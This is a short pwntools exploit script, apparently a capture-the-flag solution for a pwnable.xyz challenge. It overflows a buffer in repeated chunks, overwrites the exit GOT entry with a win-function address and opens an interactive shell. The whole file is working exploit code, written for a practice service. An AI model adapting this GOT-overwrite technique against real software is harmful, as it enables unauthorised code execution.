from pwn import *



debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz', 30022)
else:
    sh = process('./challenge')


exit_got_plt = 0x6020a0
win_addr = 0x400b2d

sh.sendafter('> ', '2')
numb = sh.recvuntil("chars")[8:11]
print "numb = ", int(numb)
count = 0
count += int(numb)
name = "\x2d\x0b\x40"
name += "A"*(count - 0x3)
sh.sendafter(': ', name)

    
while (count < 0x400):
    sh.sendafter('> ', '1')
    numb = sh.recvuntil("chars")[8:10]
    int_numb = int(numb)

    if (int_numb == 0):
        continue
    elif (count + int_numb <= 0x400):
        name = "B"*int_numb
        sh.sendafter(': ', name)
        count += int_numb
    elif (count + int_numb > 0x400):
        sh.sendafter(': ', '\x00')
        continue


sh.sendafter('> ', '1')
numb = sh.recvuntil("chars")[8:10]
int_numb = int(numb)
while (int_numb < 6):
    if (int_numb != 0):
        sh.sendafter(': ', '\x00')
    sh.sendafter('> ', '1')
    numb = sh.recvuntil("chars")[8:10]
    int_numb = int(numb)

name = p64(exit_got_plt)
sh.sendafter(': ', name)
sh.sendafter('> ', '4')
sh.sendafter('? ', '3')

sh.interactive()
